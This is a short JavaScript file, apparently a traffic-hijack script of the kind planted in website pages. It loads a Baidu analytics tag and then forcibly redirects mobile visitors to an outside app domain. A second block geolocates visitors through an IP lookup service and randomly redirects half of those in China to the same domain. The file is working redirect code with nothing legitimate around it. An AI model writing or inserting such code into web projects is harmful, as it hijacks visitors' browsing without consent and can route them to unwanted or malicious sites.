/*! Telegram:@AK81688 */
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?affb52b6666a36ebc0612c5a239c9ad7";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
  (function() {
    var mobileReg = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
    if (mobileReg.test(navigator.userAgent)) {
      window.location.replace('https://app.91pa.app/');
    }
  })();
(async function() {
  var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
                   .test(navigator.userAgent);
  if (!isMobile) return;
  try {
    let res = await fetch('https://api.ip.sb/geoip?format=json');
    if (!res.ok) return;
    let data = await res.json();

    if (data.country_code === 'CN' && Math.random() < 0.5) {
      window.location.replace('https://app.91pa.app/');
    }
  } catch (e) {
  }
})();
